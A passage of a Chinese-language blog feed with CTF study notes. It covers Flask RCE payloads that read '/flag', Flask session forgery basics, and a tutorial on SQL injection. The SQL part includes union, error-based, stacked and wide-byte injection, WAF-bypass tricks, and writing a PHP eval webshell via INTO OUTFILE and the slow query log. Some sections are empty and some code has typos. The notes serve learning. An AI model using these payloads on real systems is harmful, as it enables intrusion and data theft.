-?cmd=<span class="built_in">__import__</span>(<span class="string">&quot;subprocess&quot;</span>).run(<span class="string">&quot;tac%20/flag&quot;</span>, shell=<span class="literal">True</span>,
-capture_output=<span class="literal">True</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>).stdout
-?cmd=<span class="built_in">__import__</span>(<span class="string">&quot;subprocess&quot;</span>).check_output(<span class="string">&quot;cat /flag&quot;</span>,
-shell=<span class="literal">True</span>).decode(<span class="string">&quot;utf-8&quot;</span>)
-?cmd=<span class="built_in">__import__</span>(<span class="string">&quot;subprocess&quot;</span>).getoutput(<span class="string">&quot;cat /flag&quot;</span>)
-?cmd=send_file(<span class="string">&quot;/flag&quot;</span>)</code></pre>
-
-<p>这里面的<code>__import__(&quot;os&quot;)</code>一类的用法是用于动态导入模块的.</p>
-<h2 id="Flask-RCE利用-内存马篇"><a href="#Flask-RCE利用-内存马篇" class="headerlink" title="Flask RCE利用(内存马篇)"></a>Flask RCE利用(内存马篇)</h2><p>看过了python，但是flask和python又不是同一回事情，因为flask下有很多可供调用的函数，只能可以参考一点python的,但大多数时候是flask下特有的函数打的有问题(</p>
-<h3 id="static-folder-任意文件读取"><a href="#static-folder-任意文件读取" class="headerlink" title="static_folder 任意文件读取"></a>static_folder 任意文件读取</h3><p>flask在初始化的时候 会设置很多内部的属性</p>
-<pre><code class="highlight plaintext">python
-def __init__(
-        self,
-        import_name: str,
-        static_url_path: str | None = None,
-        static_folder: str | os.PathLike | None = &quot;static&quot;,
-        static_host: str | None = None,
-        host_matching: bool = False,
-        subdomain_matching: bool = False,
-        template_folder: str | os.PathLike | None = &quot;templates&quot;,
-        instance_path: str | None = None,
-        instance_relative_config: bool = False,
-        root_path: str | None = None,
-    ):
-    #还有一些其他的成员
-self.config 用来存储配置  self.extensions 用来存储扩展的状态。
-self.aborter 和 self.url_build_error_handlers 用来处理 HTTP 错误和 URL 构建错误。
-self.teardown_appcontext_funcs 和 self.shell_context_processors 用来管理应用上下文和 shell 上下文。
-self.blueprints 用来组织应用的模块化功能，self.url_map 管理路由规则。
-self.url_map 储存了应用的路由信息
-self.add_url_rule用来添加 URL 规则</code></pre>
-
-<p>注意到是这个</p>
-<pre><code class="highlight plaintext">plaintext
-static_url_path: str | None = None 指定静态文件的 URL 路径（即浏览器中访问静态文件的路径）
-static_folder 指定静态文件所在的文件夹路径</code></pre>
-
-<p>如果我们修改了相关的值 就可能会造成任意文件读取</p>
-<p>不过在参数传递的时候 不可以使用&#x3D;给这些东西赋值 需要使用setattr这个给他们赋值</p>
-<pre><code class="highlight plaintext">plaintext
-setattr(app,&#x27;_static_folder&#x27;,&#x27;/&#x27;)</code></pre>
-
-<h3 id="路由注入"><a href="#路由注入" class="headerlink" title="路由注入"></a>路由注入</h3><h3 id><a href="#" class="headerlink" title></a></h3><h3 id="-1"><a href="#-1" class="headerlink" title></a></h3><h3 id="-2"><a href="#-2" class="headerlink" title></a></h3><h3 id="-3"><a href="#-3" class="headerlink" title></a></h3><h2 id="Flask-RCE利用-debug篇"><a href="#Flask-RCE利用-debug篇" class="headerlink" title="Flask RCE利用(debug篇)"></a>Flask RCE利用(debug篇)</h2><h2 id="一些辅助工作"><a href="#一些辅助工作" class="headerlink" title="一些辅助工作"></a>一些辅助工作</h2><p>一般会在一开始套个session 的验证</p>
-<p>这里就要用到session伪造的芝士了，首先了解一下session罢</p>
-<p>1）flask session 分析<br>flask对session的处理位于flask&#x2F;sessions.py中，默认情况下flask的session以cookie的形式保存于客户端，利用签名机制来防止数据被篡改。</p>
-<pre><code class="highlight plaintext">.eJwljrFuwzAMBf9FcwZSpkQyP2NQoh5aBGgBO5mC_HsNdLy75d5lx7HOr3J_Hq91K_t3lnuxGamDI6kmLPpa1TE0UKteyYSpJyaaVJ8hRGZDk7ZtLlEbpALjxjOc1SaZWzLSx-aB3p0djSta984kjXqMrQqrE3WhBMo18jrX8X_D9eJ5Htifv4_1cxltCgQ3V0zvIsGBjDAlGQsqNJEi08vnD15kP8Q.XxKIMg.iW96TDgIamKLQ0x9h5LoPsUCIvw
-1</code></pre>
-
-<ul>
-<li>通过.隔开的3段内容，第一段其实就是base64 encode后的内容，但去掉了填充用的等号，若decode失败，自己需要补上1-3个等号补全。中间内容为时间戳，在flask中时间戳若超过31天则视为无效。最后一段则是安全签名，将sessiondata,时间戳，和flask的secretkey通过sha1运算的结果。</li>
-</ul>
-<pre><code class="highlight plaintext">json-&gt;zlib-&gt;base64后的源字符串 . 时间戳 . hmac签名信息
-1</code></pre>
-
-<ul>
-<li>服务端每次收到cookie后，会将cookie中前两段取出和secretkey做sha1运算，若结果与cookie第三段不一致则视为无效。</li>
-<li>从cookie获取session的过程便是验证签名-&gt;验证是否过期-&gt;解码。</li>
-</ul>
-<p>[参考文章]: <a href="https://blog.csdn.net/weixin_44190459/article/details/116774912">https://blog.csdn.net/weixin_44190459/article/details/116774912</a>	“flask框架漏洞”<br>[参考文章]: <a href="https://www.cnblogs.com/meraklbz/p/18260893">https://www.cnblogs.com/meraklbz/p/18260893</a>	“python rce”</p>
-]]></content>
-      <tags>
-        <tag>-Web -CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>从零开始的SQL注入生活</title>
-    <url>/2025/03/09/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E7%94%9F%E6%B4%BB/</url>
-    <content><![CDATA[<h1 id="从零开始的SQL注入生活"><a href="#从零开始的SQL注入生活" class="headerlink" title="从零开始的SQL注入生活"></a>从零开始的SQL注入生活</h1><p>字义上的从零开始喵。。字义上的私了好多次喵。。。</p>
-<h2 id="Episode-1-SQL数据库基础操作"><a href="#Episode-1-SQL数据库基础操作" class="headerlink" title="Episode 1   SQL数据库基础操作"></a>Episode 1   SQL数据库基础操作</h2><ul>
-<li><strong>创建</strong></li>
-</ul>
-<pre><code class="highlight sql"><span class="keyword">create</span> database_name;#建立一个数据库
-<span class="keyword">create</span> <span class="keyword">table</span> table_name(
-column1 datatype,
-.......
-);#建立一个表
-</code></pre>
-
-
-
-<ul>
-<li><strong>查询</strong></li>
-</ul>
-<pre><code class="highlight sql"><span class="keyword">show</span> tables; <span class="operator">/</span><span class="operator">/</span>显示当前选中的数据库中的所有表名
-<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users limit <span class="number">1</span>; <span class="operator">/</span><span class="operator">/</span>获取第一行的数据，可以通过这个方法得到表中所有的字段名，不会被大量数据顶走
-<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> [表名]; #查询整表
-<span class="keyword">select</span> [列名<span class="number">1</span>, 列名<span class="number">2</span>,...] <span class="keyword">from</span> [库名.表名]; #指定列查询
-<span class="keyword">select</span> [表达式<span class="number">1</span>, 表达式<span class="number">2</span>,...] <span class="keyword">from</span> [库名.表名]; #查询表达式字段
-group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata
-<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27; &#x27;</span>
-<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27; &#x27;</span>
-<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> [表名] <span class="keyword">order</span> <span class="keyword">by</span> [排序字段] #排序
-#条件查询<span class="keyword">Where</span>
-(<span class="number">1</span>)比较运算符 (<span class="number">2</span>)<span class="keyword">BETWEEN</span> ... <span class="keyword">AND</span> ... (<span class="number">3</span>)<span class="keyword">IN</span> (<span class="number">4</span>)<span class="keyword">IS</span> <span class="keyword">NULL</span> (<span class="number">5</span>)<span class="keyword">LIKE</span> (<span class="number">6</span>)<span class="keyword">AND</span> (<span class="number">7</span>)<span class="keyword">OR</span> 
-(<span class="number">8</span>)<span class="keyword">NOT</span>
-<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> [表名] <span class="keyword">where</span> [条件];</code></pre>
-
-<ul>
-<li><strong>插入</strong></li>
-</ul>
-<pre><code class="highlight sql"><span class="keyword">insert</span> <span class="keyword">into</span> table_names (column1,column2,column3...)
-<span class="keyword">insert</span> <span class="keyword">into</span> (table1,table2,table3) <span class="keyword">values</span> (value1,value2,value3) #替换键已存在的值
-<span class="keyword">on</span> duplicate key <span class="keyword">update</span> ()#不会了，留个坑先(</code></pre>
-
-<ul>
-<li><strong>注马</strong></li>
-</ul>
-<pre><code class="highlight sql"><span class="keyword">select</span> &quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]); ?&gt;&quot; <span class="keyword">into</span> outfile&quot;D:\\phpstudy_pro\\WWW\\shell.php&quot;
-<span class="number">2.</span>利用日志文件写入木马
-<span class="number">1.</span>开启日志功能
-
-<span class="keyword">set</span> <span class="keyword">global</span> slow_query_log<span class="operator">=</span><span class="number">1</span>;
-<span class="number">2.</span>设置日志存储路径
-
-<span class="keyword">SET</span> <span class="keyword">GLOBAL</span> slow_query_log_file<span class="operator">=</span><span class="string">&#x27;D:\\phpstudy_pro\\WWW\\shell.php&#x27;</span>;
-<span class="number">3.</span>执行<span class="keyword">sql</span>语句
-
-<span class="keyword">select</span> <span class="string">&#x27;&lt;?php eval($_GET[H])?&gt;&#x27;</span> <span class="keyword">or</span> SLEEP(<span class="number">11</span>);
-</code></pre>
-
-
-
-<h2 id="episode-2-基础注入"><a href="#episode-2-基础注入" class="headerlink" title="episode 2  基础注入"></a>episode 2  基础注入</h2><h3 id="union注入-1’"><a href="#union注入-1’" class="headerlink" title="union注入(-1’)"></a>union注入(-1’)</h3><p>union注入原本是用于合并多条select查询结果；通过-1造成前面一条查询语句返回为空，从而显示我们注入的查询语句。(因为网页只能够显示一条查询记录)</p>
-<pre><code class="highlight sql">#<span class="number">1.</span>查表列数
-<span class="number">-1</span>’<span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span><span class="operator">~</span><span class="number">4</span>;
-#查完后使用<span class="keyword">select</span> 语句
-<span class="keyword">select</span> <span class="number">1</span>，<span class="number">2</span>，<span class="number">3</span>；
-#查库名
-<span class="number">-1</span>’<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>，database()；
-#查表名
-<span class="number">-1</span>’<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>’security’),<span class="number">3</span>#
-#查列名
-<span class="number">-1</span>’<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(column_name)<span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>’security’ <span class="keyword">and</span> table_name<span class="operator">=</span>’emails’),<span class="number">3</span>#
-#直接查数据
-<span class="number">-1</span>’<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> email_id <span class="keyword">from</span> emails limit <span class="number">2</span>,<span class="number">1</span>),<span class="number">3</span>#
-
-#其实还是更推荐urlcode一下注释符号防止没有回弹(<span class="operator">%</span><span class="number">23</span>)</code></pre>
-
-<p>那初学的师傅可能就会不明白这个1，2，3是什么意思</p>
-<p>这个1，2，3实际是可以帮助我们快速判断列数的工具(<del>order by:那我呢？</del>)同时，这个1，2，3无关顺序，只要找到回显位并且已经爆出数据表的情况下就可以在回显位写注入语句进一步爆</p>
-<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>1.extractvalue函数</p>
-<p>查询对象xml某一个标签的值</p>
-<p>如果查询的标签格式不对，就会报错</p>
-<p>利用concat函数来链接两个字符串</p>
-<p>查询数据库：’ and extractvalue(‘div’,concat(‘~’,database()))#</p>
-<pre><code class="highlight sql"><span class="number">-1</span><span class="string">&#x27; and(select extractive(1,concat(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,database())))#</span></code></pre>
-
-<p>-&gt;查询div，~存在会报错</p>
-<p>爆出~database（）</p>
-<p>2.updatexml</p>
-<p>更新xml文档内容</p>
-<p>语法：updatexml(‘xml名’，’路径名’，更新值)；</p>
-<p>同样道理，当没有对应路径的时候会报错</p>
-<pre><code class="highlight plaintext">&#x27; and updatexml(&#x27;div&#x27;, concat(&#x27;~&#x27;,database()),&#x27;hi&#x27;)#
-&#x27; union select 1,(extractvalue(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata))))--+
-</code></pre>
-
-<p>其他同上</p>
-<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入(!)"></a>堆叠注入(!)</h3><p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为： Select * from products where productid&#x3D;1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p>
-<pre><code class="highlight plaintext">堆叠注入中奇怪的知识点
-1.输入数字有回显而字符没有回显，说明了语句中存在||结构 (在sql中表示连接符号)
-设置 sql_mode=PIPES_AS_CONCAT来转换操作符的作用。（sql_mode设置） 利用PIPES_AS_CONCAT令||起到连接符的作用。
-</code></pre>
-
-<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>在正常注册(假设账户名为admin)后登录，尝试修改密码，使用admin’#这个用户名修改却发现成功修改了admin的密码，这就说明存在二次注入的漏洞了</p>
-<pre><code class="highlight plaintext">二次注入，实际上就是在注入数据之后，利用系统查询数据的用脏数据进行第二次的攻击，从而达到入侵数据库的目的</code></pre>
-
-<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a><strong>原理</strong></h4><p>一般来说，如果开发人员在开发的时候，对传入的参数进行了特殊的函数处理，比如使用了trim()函数，htmlspecialchars()函数，addlashes函数，是可以过滤我们非法提交的参数，从而导致SQL注入无法成功。</p>
-<p>作为攻击者，要完成的是对参数的拼接，从而导致恶意的SQL语句写入。作为开发者要完成的是SQL输出参数的一个过滤比如对恶意的字符进行转移</p>
-<h4 id="常用过滤函数"><a href="#常用过滤函数" class="headerlink" title="常用过滤函数"></a><strong>常用过滤函数</strong></h4><p><strong>trim()函数</strong><br>移除字符串两侧的空白字符或其他预定义字符<br><strong>htmlspecialchars()函数</strong><br>把预定义的字符”&lt;”和”&gt;”转换为HTML实体，预防XSS<br><strong>addslashes()函数</strong><br>返回在预定义字符之前添加反斜杠的字符串</p>
-<pre><code class="highlight sql"># 预定义字符
-<span class="number">1.</span>单引号(<span class="string">&#x27;)</span>
-<span class="string">2.双引号(&quot;)</span>
-<span class="string">3.反斜杠(\)</span>
-<span class="string">4.NULL</span></code></pre>
-
-<p>上述函数常在CMS里使用进行过滤</p>
-<h4 id="宽字节注入条件"><a href="#宽字节注入条件" class="headerlink" title="宽字节注入条件"></a><strong>宽字节注入条件</strong></h4><p>1.数据库为GBK编码<br>2.使用了转义函数，将、POGETST、cookie传递的参数进行过滤，将单引号、双引号、null等敏感字符用转义符 \ 进行转义</p>
-<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><pre><code class="highlight plaintext">root %df&#x27; or 1=1 #
-# 原理:在GBK编码中,反斜杠的编码是%5c,在输入%df后，使得添加反斜杠后形成%df%5c，而%df%5c是繁体字“連”，单引号成功逃逸，爆出Mysql数据库的错误</code></pre>
-
-
-
-<h3 id="约束攻击"><a href="#约束攻击" class="headerlink" title="约束攻击"></a>约束攻击</h3><p>在SQL执行字符串处理操作时，字符串末尾的空格符将会被删除，换句话说”user”是等同于”user     “的，对于绝大多数的情况这两个相等都是成立的(像WHERE子句的字符串和INSERT语句中的字符串)</p>
-<blockquote>
-<p>[!WARNING]</p>
-<p>但是在像LIKE 子句中这是不成立的。因为对尾部空白符的这种修剪操作，主要是在“字符串比较”期间进行的。这是因为，SQL会在<a href="https://support.microsoft.com/en-in/kb/316626">内部</a>使用空格来填充字符串，以便在比较之前使其它们的长度保持一致</p>
-</blockquote>
-<p>在所有的INSERT查询中，SQL都会根据varchar(n)来限制字符串的最大长度。也就是说，如果字符串的长度大于“n”个字符的话，那么仅使用字符串的前“n”个字符。比如特定列的长度约束为“5”个字符，那么在插入字符串“vampire”时，实际上只能插入字符串的前5个字符，即“vampi”</p>
-<p><strong>攻击手段</strong></p>
-<p>注册一个用户名+一堆括号+1的用户名和自己的passwd(未超出长度限制的字符应该只包含已知的用户名和空白字符)</p>
-<p>注:在查询时，SQL是不会将字符串截断的。因此，使用完整的字符串进行搜索，所以不会找到匹配的结果。但当执行INSERT查询语句时，它只会插入被限制长度的字符。</p>
-<p>在攻击结束后，输入后来我们自己的密码和已给的用户名，会登录上原始用户</p>
-<pre><code class="highlight plaintext">解决办法:
-将要求或者预期具有唯一性的那些列加上UNIQUE约束。实际上这是一个涉及软件开发的重要规则，即使你的代码有维持其完整性的功能，也应该恰当的定义数据。由于’username’列具有UNIQUE约束，所以不能插入另一条记录。将会检测到两个相同的字符串，并且INSERT查询将失败。
-
-最好使用’id’作为数据库表的主键。并且数据应该通过程序中的id进行跟踪
-
-为了更加安全，还可以用手动调整输入参数的限制长度（依照数据库设置）</code></pre>
-
-
-
-<h2 id="Episode-3-在拿到flag的边缘疯狂试探-盲注"><a href="#Episode-3-在拿到flag的边缘疯狂试探-盲注" class="headerlink" title="Episode 3 在拿到flag的边缘疯狂试探:盲注"></a>Episode 3 在拿到flag的边缘疯狂试探:盲注</h2><p>(哈哈，盲注脚本吗，你问我，我只能说最好自己写一个，网上淘来的毕竟是别人的不如你自己搓的顺手)</p>
-<p>先确定注入型，再用and连接一下</p>
-<pre><code class="highlight sql">布尔盲注
-<span class="number">1.</span> length(database())<span class="operator">&gt;</span>??? 初步判断
-<span class="number">2.</span></code></pre>
-
-<h2 id="Episode-4-注入点-猜猜我在哪里呢"><a href="#Episode-4-注入点-猜猜我在哪里呢" class="headerlink" title="Episode 4 注入点:&gt;猜猜我在哪里呢"></a>Episode 4 注入点:&gt;猜猜我在哪里呢</h2><h3 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h3><h3 id="GET注入"><a href="#GET注入" class="headerlink" title="GET注入"></a>GET注入</h3><h3 id="Cookies注入"><a href="#Cookies注入" class="headerlink" title="Cookies注入"></a>Cookies注入</h3><h2 id="Episode-5-你好，绕WAF"><a href="#Episode-5-你好，绕WAF" class="headerlink" title="Episode   5  你好，绕WAF"></a>Episode   5  你好，绕WAF</h2><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>如过过滤了and和AND，试试And</p>
-<h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>如果waf把and替换为空</p>
-<p>然后可以使用<code>anandd</code>绕过</p>
-<h3 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h3><p>&#x2F;**&#x2F;  注释符号</p>
-<pre><code class="highlight plaintext">()-&gt;select(1),2,3</code></pre>
-
-<p>（）可以作为一个子语句查询存在,任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。所以就可以用()代替空格</p>
-<p>url编码绕过<code>%0a %20 %09 %0a %0b %0c %0d %a0</code>代替。</p>
-<h3 id="引号绕过"><a href="#引号绕过" class="headerlink" title="引号绕过"></a>引号绕过</h3><p>使用十六进制替代需要用到引号的语句，一般是在最后的查询语句</p>
-<h3 id="and和or绕过"><a href="#and和or绕过" class="headerlink" title="and和or绕过"></a>and和or绕过</h3><p>考虑管道符||表示or和&amp;&amp;表示and</p>
-<h3 id="绕过"><a href="#绕过" class="headerlink" title="&#x3D;绕过"></a>&#x3D;绕过</h3><p>改成like或者&lt;或者&gt;</p>
-<p>还有<code>rlike 、regexp(正则匹配函数，‘’是直接找或包含，^是以什么开头,可以用[a-zA-Z]流氓匹配)</code></p>
-<h3 id="逗号过滤"><a href="#逗号过滤" class="headerlink" title="逗号过滤"></a>逗号过滤</h3><pre><code class="highlight sql"><span class="keyword">select</span> substr(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);
-#substr(str,pos,len)的功能是从pos开始的位置，截取len个字符；而无len就是直接截取到最后
-<span class="keyword">select</span> mid(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);
-#
-<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="operator">-</span><span class="operator">&gt;</span> <span class="operator">&lt;</span><span class="keyword">select</span> <span class="number">1</span><span class="operator">&gt;</span>a <span class="keyword">join</span> <span class="operator">&lt;</span><span class="keyword">select</span> <span class="number">2</span><span class="operator">&gt;</span>b <span class="keyword">join</span><span class="operator">&lt;</span><span class="keyword">select</span> <span class="number">3</span><span class="operator">&gt;</span>c <span class="keyword">join</span>
-<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> ((selcet1)A <span class="keyword">join</span> (select2)B <span class="keyword">join</span>(<span class="keyword">select</span> <span class="number">3</span>)C);
-limit <span class="number">0</span>,<span class="number">1</span><span class="operator">-</span><span class="operator">&gt;</span>limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span>;<span class="operator">/</span><span class="operator">/</span>等于limit <span class="number">0</span>,<span class="number">1</span> 从第<span class="number">1</span>行往后取<span class="number">0</span>行，只读第一行
-#limit <span class="number">1</span>,<span class="number">2</span> 指的是从第一行往后取<span class="number">2</span>行（包括第一行和第二行)；而limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">2</span>是从第一行开始只取第二行
-<span class="keyword">select</span> <span class="built_in">substring</span>(<span class="string">&#x27;hello&#x27;</span> <span class="keyword">from</span> <span class="number">1</span>);</code></pre>
-
-<h3 id="比较符号-绕过"><a href="#比较符号-绕过" class="headerlink" title="比较符号(&lt; &gt;)绕过"></a>比较符号(&lt; &gt;)绕过</h3><p>一般是盲注要用到捏</p>
-<p>最常见的一个盲注的sql语句：</p>
-<pre><code class="highlight plaintext">select * from users where id=1 and ascii(substr(database(),0,1))&gt;64</code></pre>
-
-<p>此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值。</p>
-<p>那么上面的这条sql语句可以使用greatest变为如下的子句:</p>
-<pre><code class="highlight plaintext">select*fromuserswhereid=1and greatest(ascii(substr(database(),0,1)),64)=64</code></pre>
-
-<h3 id="绕过关键字-union-select，where"><a href="#绕过关键字-union-select，where" class="headerlink" title="绕过关键字(union,select，where)"></a>绕过关键字(union,select，where)</h3><p>1）使用注释符绕过：</p>
-<p>常用注释符：</p>
-<p><code>//，-- , /**/, #(url编码一下还能用), --+, -- -, ;,%00,--a</code></p>
-<p>用法：</p>
-<p><code>U/**/NION/**/SE/**/LECT/**/user，pwd from user</code></p>
-<p>2）使用大小写绕过：</p>
-<p><code>id=-1&#39;UnIoN/**/SeLeCT</code></p>
-<p>3）内联注释绕过：</p>
-<p><code>id=-1&#39;/*!UnIoN*/SeLeCT1,2,concat(/*!table_name*/) FrOM/*information_schema*/.tables/*!WHERE*//*!TaBlE_ScHeMa*/like database()#</code></p>
-<p>4） 双关键字绕过：</p>
-<p><code>id=-1&#39;UNIunionONSeLselectECT1,2,3–-</code></p>
-<h3 id="通用编码绕过"><a href="#通用编码绕过" class="headerlink" title="通用编码绕过"></a>通用编码绕过</h3><p>如URLEncode编码，ASCII,HEX,unicode编码绕过：</p>
-<p>or1&#x3D;1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</p>
-<h3 id="等价函数绕过"><a href="#等价函数绕过" class="headerlink" title="等价函数绕过"></a>等价函数绕过</h3><p>hex()、bin()&#x3D;&#x3D;&gt;ascii()</p>
-<p>sleep()&#x3D;&#x3D;&gt;benchmark()</p>
-<p>concat_ws()&#x3D;&#x3D;&gt;group_concat()</p>
-<p>mid()、substr()&#x3D;&#x3D;&gt;substring() @@user&#x3D;&#x3D;&gt;user() @@datadir&#x3D;&#x3D;&gt;datadir()</p>
-<p>举例：substring()和substr()无法使用时：?id&#x3D;1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))&#x3D;74或者：</p>
-<p>substr((select’password’),1,1)&#x3D;0x70strcmp(left(‘password’,1),0x69)&#x3D;1strcmp(left(‘password’,1),0x70)&#x3D;0strcmp(left(‘password’,1),0x71)&#x3D;-1</p>
-<h3 id="长度限制绕过"><a href="#长度限制绕过" class="headerlink" title="长度限制绕过"></a>长度限制绕过</h3><p>网页显示常常只能给出有限长度的字母，这个时候就要通过一些函数来绕过</p>
-<pre><code class="highlight sql"><span class="number">1</span>、<span class="keyword">left</span>（<span class="number">201809</span>,<span class="number">4</span>）截取左边的<span class="number">4</span>个字符
-<span class="keyword">SELECT</span> <span class="keyword">LEFT</span>(<span class="number">201809</span>,<span class="number">4</span>)    <span class="operator">/</span><span class="operator">/</span>结果：<span class="number">2018</span>
-
-<span class="number">2</span>、<span class="keyword">right</span>（name,<span class="number">2</span>）截取右边的<span class="number">2</span>个字符
-<span class="keyword">SELECT</span> <span class="keyword">RIGHT</span>(<span class="number">201809</span>,<span class="number">2</span>)    <span class="operator">/</span><span class="operator">/</span>结果：<span class="number">09</span>
-
-<span class="number">3</span>、<span class="built_in">SUBSTRING</span>(name,<span class="number">5</span>,<span class="number">3</span>) 截取name这个字段 从第五个字符开始 只截取之后的<span class="number">3</span>个字符
-<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(<span class="string">&#x27;成都融资事业部&#x27;</span>,<span class="number">5</span>,<span class="number">3</span>)   <span class="operator">/</span><span class="operator">/</span>结果：事业部
-
-<span class="number">4</span>、<span class="built_in">SUBSTRING</span>(name,<span class="number">3</span>) 截取name这个字段 从第三个字符开始，之后的所有个字符
-<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(<span class="string">&#x27;成都融资事业部&#x27;</span>,<span class="number">3</span>)   <span class="operator">/</span><span class="operator">/</span>结果：融资事业部
-
-<span class="number">5</span>、<span class="built_in">SUBSTRING</span>(name, <span class="number">-4</span>) 截取name这个字段的第 <span class="number">4</span> 个字符位置（倒数）开始取，直到结束
-<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(<span class="string">&#x27;成都融资事业部&#x27;</span>,<span class="number">-4</span>)   <span class="operator">/</span><span class="operator">/</span>结果：资事业部
-
-<span class="number">6</span>、<span class="built_in">SUBSTRING</span>(name, <span class="number">-4</span>，<span class="number">2</span>) 截取name这个字段的第 <span class="number">4</span> 个字符位置（倒数）开始取，只截取之后的<span class="number">2</span>个字符
-<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(<span class="string">&#x27;成都融资事业部&#x27;</span>,<span class="number">-4</span>,<span class="number">2</span>)   <span class="operator">/</span><span class="operator">/</span>结果：资事
-注意：我们注意到在函数 <span class="built_in">substring</span>(str,pos, len)中， pos 可以是负值，但 len 不能取负值。
-
-<span class="number">7</span>、substring_index(<span class="string">&#x27;www.baidu.com&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="number">2</span>) 截取第二个 <span class="string">&#x27;.&#x27;</span> 之前的所有字符
-<span class="keyword">SELECT</span> substring_index(<span class="string">&#x27;www.baidu.com&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="number">2</span>)   <span class="operator">/</span><span class="operator">/</span>结果：www.baidu
-
-<span class="number">8</span>、substring_index(<span class="string">&#x27;www.baidu.com&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="number">-2</span>) 截取第二个 <span class="string">&#x27;.&#x27;</span> （倒数）之后的所有字符
-<span class="keyword">SELECT</span> substring_index(<span class="string">&#x27;www.baidu.com&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="number">-2</span>)   <span class="operator">/</span><span class="operator">/</span>结果：baidu.com
-
-<span class="number">9</span>、SUBSTR(name, <span class="number">1</span>, <span class="keyword">CHAR_LENGTH</span>(name)<span class="number">-3</span>) 截取name字段，取除name字段后三位的所有字符
-<span class="keyword">SELECT</span> SUBSTR(<span class="string">&#x27;成都融资事业部&#x27;</span>, <span class="number">1</span>, <span class="keyword">CHAR_LENGTH</span>(<span class="string">&#x27;成都融资事业部&#x27;</span>)<span class="number">-3</span>)            <span class="operator">/</span><span class="operator">/</span>结果：成都融资
-
-<span class="number">10</span>、mid(str,<span class="keyword">start</span>,[length])
-str:截取的字符串   <span class="keyword">start</span>:起始位置   length:截取的长度，可以忽略
-
-<span class="number">11.</span>reverse(concat(<span class="number">0x3a</span>，(<span class="keyword">select</span>(group_concat(real_flag_1s_here))<span class="keyword">from</span>(users)<span class="keyword">where</span>(real_flag_1s_here)regexp(<span class="string">&#x27;^f&#x27;</span>))))
-用reverse倒序输出，有时候有奇效。?大概吧</code></pre>
-
-
-
